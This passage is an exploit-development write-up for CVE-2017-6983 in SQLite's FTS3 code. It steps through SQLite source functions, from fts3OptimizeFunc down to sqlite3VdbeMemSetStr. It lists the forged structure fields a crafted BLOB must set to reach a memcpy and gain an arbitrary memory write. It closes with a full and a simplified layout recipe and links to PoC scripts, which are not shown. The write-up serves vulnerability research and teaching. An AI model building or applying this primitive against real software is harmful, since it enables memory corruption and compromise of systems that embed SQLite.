 87373 static int vdbeSafety(Vdbe *p){
 87374   if( p->db==0 ){
 87375     sqlite3_log(SQLITE_MISUSE, "API called with finalized prepared statement");
 87376     return 1;
 87377   }else{
 87378     return 0;
 87379   }
 87380 }
```

`vdbeSatefy` merely checks its `db` member, so we have fixed it by pointing to a real (fake) `sqlite` structure.

```c
 87414 /*
 87415 ** The checkProfileCallback(DB,P) macro checks to see if a profile callback
 87416 ** is needed, and it invokes the callback if it is needed.
 87417 */
 87418 # define checkProfileCallback(DB,P) \
 87419    if( ((P)->startTime)>0 ){ invokeProfileCallback(DB,P); }
 87420 #else
 87421 # define checkProfileCallback(DB,P)  /*no-op*/
 87422 #endif
```

We need to set `Vdbe.startTime` to 0 to avoid invoking `invokeProfileCallback`. Also, need to set `Vdbe.eVdbeState = 1` to bypass the `assert` at line 87745.

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob_metadata (0x8)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
# Vdbe (0x138)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
Incrblob_metadata = 0
Incrblob.db = &sqlite3
sqlite3.mutex = 0
sqlite3.lookaside.pEnd = 0
sqlite3.pnBytesFreed = &nBytesFreed
sqlite3.lookaside.pTrueEnd = 0
Incrblob.pStmt = &Vdbe
Vdbe.db = &sqlite3
+ Vdbe.startTime = 0
+ Vdbe.eVdbeState = 1
```

### 11. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3_finalize > sqlite3VdbeReset

Now we enter `sqlite3VdbeReset`. This function is long and complex, so we will take time to analyze it.

```c
 85436   if( p->eVdbeState==VDBE_RUN_STATE ) sqlite3VdbeHalt(p);
```

We have set `eVdbeState` to `VDBE_READY_STATE`, not `VDBE_RUN_STATE`.

```c
 85438   /* If the VDBE has been run even partially, then transfer the error code
 85439   ** and error message from the VDBE into the main database structure.  But
 85440   ** if the VDBE has just been set to run but has not actually executed any
 85441   ** instructions yet, leave the main database error information unchanged.
 85442   */
 85443   if( p->pc>=0 ){
 85444     vdbeInvokeSqllog(p);
 85445     if( db->pErr || p->zErrMsg ){
 85446       sqlite3VdbeTransferError(p);
 85447     }else{
 85448       db->errCode = p->rc;
 85449     }
 85450   }
```

Here we want the execution go into `sqlite3VbdeTransferError`, so we make `p->pc = 0`. Meanwhile, we make `db-pErr` point to a valid `sqlite3_value` structure, and make `p->zErrMsg` to a temporary pointer, say the same as `base`.

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob_metadata (0x8)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
# Vdbe (0x138)
# + sqlite3_value (0x48)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
Incrblob_metadata = 0
Incrblob.db = &sqlite3
sqlite3.mutex = 0
sqlite3.lookaside.pEnd = 0
sqlite3.pnBytesFreed = &nBytesFreed
sqlite3.lookaside.pTrueEnd = 0
Incrblob.pStmt = &Vdbe
Vdbe.db = &sqlite3
Vdbe.startTime = 0
Vdbe.eVdbeState = 1
+ Vdbe.pc = 0
+ Vdbe.zErrMsg = &Fts3Cursor (temporary)
+ sqlite3.pErr = &sqlite3_value
```

After this setting, we are ready to invoke `sqlite3VdbeTransferError`.

### 12. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3_finalize > sqlite3VdbeReset > sqlite3VdbeTransferError

```c
 85367 ** Copy the error code and error message belonging to the VDBE passed
 85368 ** as the first argument to its database handle (so that they will be
 85369 ** returned by calls to sqlite3_errcode() and sqlite3_errmsg()).
 85370 **
 85371 ** This function does not clear the VDBE error code or message, just
 85372 ** copies them to the database handle.
 85373 */
 85374 SQLITE_PRIVATE int sqlite3VdbeTransferError(Vdbe *p){
 85375   sqlite3 *db = p->db;
 85376   int rc = p->rc;
 85377   if( p->zErrMsg ){
 85378     db->bBenignMalloc++;
 85379     sqlite3BeginBenignMalloc();
 85380     if( db->pErr==0 ) db->pErr = sqlite3ValueNew(db);
 85381     sqlite3ValueSetStr(db->pErr, -1, p->zErrMsg, SQLITE_UTF8, SQLITE_TRANSIENT);
 85382     sqlite3EndBenignMalloc();
 85383     db->bBenignMalloc--;
 85384   }else if( db->pErr ){
 85385     sqlite3ValueSetNull(db->pErr);
 85386   }
 85387   db->errCode = rc;
 85388   db->errByteOffset = -1;
 85389   return rc;
 85390 }
```

* At line 85377, `p->zErrMsg` is not `NULL`, so we will enter the `if` block.
* At line 85380, `db->pErr` is not `NULL`, so we skip the allocation.

We are ready to enter function `sqlite3ValueSetStr`.

### 13. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3_finalize > sqlite3VdbeReset > sqlite3VdbeTransferError > sqlite3ValueSetStr

```c
 81958 SQLITE_PRIVATE void sqlite3ValueSetStr(
 81959   sqlite3_value *v,     /* Value to be set */
 81960   int n,                /* Length of string z */
 81961   const void *z,        /* Text of the new string */
 81962   u8 enc,               /* Encoding to use */
 81963   void (*xDel)(void*)   /* Destructor for the string */
 81964 ){
 81965   if( v ) sqlite3VdbeMemSetStr((Mem *)v, z, n, enc, xDel);
 81966 }
```

The code here is very simple. Since `v`, which is `db->pErr` is not `NULL`, we will enter function `sqlite3VdbeMemSetStr`.

### 14. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3_finalize > sqlite3VdbeReset > sqlite3VdbeTransferError > sqlite3ValueSetStr > sqlite3VdbeMemSetStr

This function is also complex. However, the overall function is like a `memcpy(dst, src, n)`

There are a few extra constraints needed to be fixed.

Constraints in this function:

* `sqlite3_value.db` should be 0 to bypass an assert check at line 81169.

Constraints in function `sqlite3VdbeMemClearAndResize`.

* `sqlite3_value.szMalloc` should be larger than 0x20; make it `0x100` to simplify the task
* `sqlite3_value.flags & MEM_Dyn` should be `0`, so just set the `flags` to 0
* `sqlite3_value.zMalloc` is copied to `sqlite3_value.z`. This is the destination pointer.


```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob_metadata (0x8)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
# Vdbe (0x138)
# sqlite3_value (0x48)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
Incrblob_metadata = 0
Incrblob.db = &sqlite3
sqlite3.mutex = 0
sqlite3.lookaside.pEnd = 0
sqlite3.pnBytesFreed = &nBytesFreed
sqlite3.lookaside.pTrueEnd = 0
Incrblob.pStmt = &Vdbe
Vdbe.db = &sqlite3
Vdbe.startTime = 0
Vdbe.eVdbeState = 1
Vdbe.pc = 0
Vdbe.zErrMsg = &Fts3Cursor (temporary)
sqlite3.pErr = &sqlite3_value
+ sqlite3_value.db = 0
+ sqlite3_value.szMalloc = 0x100
+ sqlite3_value.flags = 0
+ sqlite3_value.zMalloc = 0xdeadbeef
```

Once this setting is done, we will reach the following line in `sqlite3VdbeMemSetStr`, which is exactly a call to `memcpy`.

```c
 81225     memcpy(pMem->z, z, nAlloc);
```

At this moment, we finally achieve arbitrary memory write, from any location, to any location.

### 15. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3_finalize > sqlite3VdbeReset

The execution will return back to `sqlite3VdbeReset` at line 85447.

```c
 85429   sqlite3 *db;
 85430   db = p->db;
 ...     ...
 85443   if( p->pc>=0 ){
 85444     vdbeInvokeSqllog(p);
 85445     if( db->pErr || p->zErrMsg ){
 85446       sqlite3VdbeTransferError(p);
 85447     }else{
 85448       db->errCode = p->rc;
 85449     }
 85450   }
 ...
 85457   if( p->apCsr ) ...
 85458   if( p->aMem ){
 85459     ...
 85460   }
 85461
 85462   if( p->zErrMsg ){
 85463     sqlite3DbFree(db, p->zErrMsg);
 85464     p->zErrMsg = 0;
 85465   }
 ...     ... // note: VDBE_PROFILE is false
 85506   return p->rc & db->errMask;
 85507 }
```

We need to set `p->apCsr`, `p->aMem` to 0. `p->zErrMsg` is not `NULL` so the execution will go into `sqlite3DbFree`. We do not have to worry about it, since we have set up a proper `sqlite` before and reuse it for this `db`.

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob_metadata (0x8)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
# Vdbe (0x138)
# sqlite3_value (0x48)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
Incrblob_metadata = 0
Incrblob.db = &sqlite3
sqlite3.mutex = 0
sqlite3.lookaside.pEnd = 0
sqlite3.pnBytesFreed = &nBytesFreed
sqlite3.lookaside.pTrueEnd = 0
Incrblob.pStmt = &Vdbe
Vdbe.db = &sqlite3
Vdbe.startTime = 0
Vdbe.eVdbeState = 1
Vdbe.pc = 0
Vdbe.zErrMsg = src_ptr
sqlite3.pErr = &sqlite3_value
sqlite3_value.szMalloc = 0x100
sqlite3_value.flags = 0
sqlite3_value.zMalloc = dst_ptr
+ Vdbe.apCsr = 0
+ Vdbe.aMem = 0
```
OK, we are good to return now, returning to line 87447 within function `sqlite3_finalize`.

```c
 87433 SQLITE_API int sqlite3_finalize(sqlite3_stmt *pStmt){
 87434   int rc;
 87435   if( pStmt==0 ){
 87436     /* IMPLEMENTATION-OF: R-57228-12904 Invoking sqlite3_finalize() on a NULL
 87437     ** pointer is a harmless no-op. */
 87438     rc = SQLITE_OK;
 87439   }else{
 87440     Vdbe *v = (Vdbe*)pStmt;
 87441     sqlite3 *db = v->db;
 87442     if( vdbeSafety(v) ) return SQLITE_MISUSE_BKPT;
 87443     sqlite3_mutex_enter(db->mutex);
 87444     checkProfileCallback(db, v);
 87445     assert( v->eVdbeState>=VDBE_READY_STATE );
 87446     rc = sqlite3VdbeReset(v);
>87447     sqlite3VdbeDelete(v);
 87448     rc = sqlite3ApiExit(db, rc);
 87449     sqlite3LeaveMutexAndCloseZombie(db);
 87450   }
 87451   return rc;
 87452 }
```

The execution will go through multiple functions, with some extra constraints.


```txt
#----------------------------------------------------------
# expected layout:

# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob_metadata (0x8)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
# Vdbe_metadata (0x8)
# Vdbe (0x138)
# sqlite3_value_metadata (0x8)
# sqlite3_value (0x48)

#----------------------------------------------------------
# required type.member values:

# Fts3Cursor.base.pVtable = &Fts3Table  (line 182454 @ fts3OptimizeFunc)
# Fts3Table.db = 0                      (line 34895 @ sqlite3SafetyCheckOk)
# Fts3Table.pSegments = &Incrblob       (line 98925 @ sqlite3_blob_close)
# Incrblob_metadata = 0                 (due to malloc_usable_size)
# Incrblob.db = &sqlite3                (line 98931 @ sqlite3_blob_close)
# sqlite3.mutex = 0                     (line 98932 @ sqlite3_blob_close)
# sqlite3.lookaside.pEnd = 0            (line 29361 @ sqlite3DbFreeNN)
# sqlite3.pnBytesFreed = &nBytesFreed   (line 29385 @ sqlite3DbFreeNN)
# sqlite3.lookaside.pTrueEnd = 0        (line 29305 @ isqlite3DbMallocSize)
# Incrblob.pStmt = &Vdbe                (line 87440 @ sqlite3_finalize)
# Vdbe_metadata = 0                     (due to malloc_usable_size)
# Vdbe.db = &sqlite3                    (line 87441 @ sqlite3_finalize)
# Vdbe.startTime = 0                    (line 87444 @ sqlite3_finalize)
# Vdbe.eVdbeState = 1                   (line 87445 @ sqlite3_finalize)
# Vdbe.pc = 0                           (line 85443 @ sqlite3VdbeReset)
# Vdbe.zErrMsg = sre_ptr                (line 85445 @ sqlite3VdbeReset)
# sqlite3_value_metadata = 0            (due to malloc_usable_size)
# sqlite3.pErr = &sqlite3_value         (line 85445 @ sqlite3VdbeReset)
# sqlite3_value.db = 0                  (line 81169 @ sqlite3VdbeMemSetStr)
# sqlite3_value.flags = 0               (line 80323 @ sqlite3VdbeMemClearAndResize)
# sqlite3_value.szMalloc = 0x100        (line 80324 @ sqlite3VdbeMemClearAndResize)
# sqlite3_value.zMalloc = dst_ptr       (line 80328 @ sqlite3VdbeMemClearAndResize)
# Vdbe.apCsr = 0                        (line 85457 @ sqlite3VdbeReset)
# Vdbe.aMem = 0                         (line 85458 @ sqlite3VdbeReset)
# Vdbe.aColName = 0                     (line 85574 @ sqlite3VdbeClearObject)
# Vdbe.pProgram = 0                     (line 85578 @ sqlite3VdbeClearObject)
# Vdbe.aVar = 0                         (line 85584 @ sqlite3VdbeClearObject)
# Vdbe.pVList = 0                       (line 85585 @ sqlite3VdbeClearObject)
# Vdbe.pFree = 0                        (line 85586 @ sqlite3VdbeClearObject)
# Vdbe.aOp = 0                          (line 85588 @ sqlite3VdbeClearObject)
# Vdbe.nOp = 0                          (line 85588 @ sqlite3VdbeClearObject)
# Vdbe.zSql = 0                         (line 85589 @ sqlite3VdbeClearObject)
```


We can luckily keep returning, until we reach back to the very first function `fts3OptimizeFunc`

### 16. sqlite3Fts3Optimize

```c
 182457   rc = sqlite3Fts3Optimize(p);
 182458
>182459   switch( rc ){
 182460     case SQLITE_OK:
 182461       sqlite3_result_text(pContext, "Index optimized", -1, SQLITE_STATIC);
 182462       break;
 182463     case SQLITE_DONE:
 182464       sqlite3_result_text(pContext, "Index already optimal", -1, SQLITE_STATIC);
 182465       break;
 182466     default:
 182467       sqlite3_result_error_code(pContext, rc);
 182468       break;
 182469   }
 182470 }
```

`rc` here comes from `sqlite3Fts3Optimize`, where we have intensionally failed `sqlite3_exec`, which makes `rc` 0x15 -- `SQLITE_MISUSE`. If we just let SQLite continue, it will report an error on the terminal.

```bash
Runtime error near line 5: bad parameter or other API misuse (21)
```

This is OK since it does not stop the execution of more SQL queries.

# At the end

We have completed the construction of a write-what-where primitive. The complete PoC is available at [cve-2017-6983-poc.py](./cve-2017-6983-poc.py).

Note that we can remove all corruptions to `0` since in our initial malicious BLOB data, the content is almost all `0`. Therefore, the layout and required changes can be reduced to a simple version.


```txt
#----------------------------------------------------------
# expected layout:

# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob_metadata (0x8)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
# Vdbe_metadata (0x8)
# Vdbe (0x138)
# sqlite3_value_metadata (0x8)
# sqlite3_value (0x48)

#----------------------------------------------------------
# required type.member values:

# Fts3Cursor.base.pVtable = &Fts3Table  (line 182454 @ fts3OptimizeFunc)
# Fts3Table.pSegments = &Incrblob       (line 98925 @ sqlite3_blob_close)
# Incrblob.db = &sqlite3                (line 98931 @ sqlite3_blob_close)
# sqlite3.pnBytesFreed = &nBytesFreed   (line 29385 @ sqlite3DbFreeNN)
# Incrblob.pStmt = &Vdbe                (line 87440 @ sqlite3_finalize)
# Vdbe.db = &sqlite3                    (line 87441 @ sqlite3_finalize)
# Vdbe.eVdbeState = 1                   (line 87445 @ sqlite3_finalize)
# Vdbe.zErrMsg = sre_ptr                (line 85445 @ sqlite3VdbeReset)
# sqlite3.pErr = &sqlite3_value         (line 85445 @ sqlite3VdbeReset)
# sqlite3_value.szMalloc = 0x100        (line 80324 @ sqlite3VdbeMemClearAndResize)
# sqlite3_value.zMalloc = dst_ptr       (line 80328 @ sqlite3VdbeMemClearAndResize)
```


The simplified PoC is available at [cve-2017-6983-poc-simple.py](./cve-2017-6983-poc-simple.py).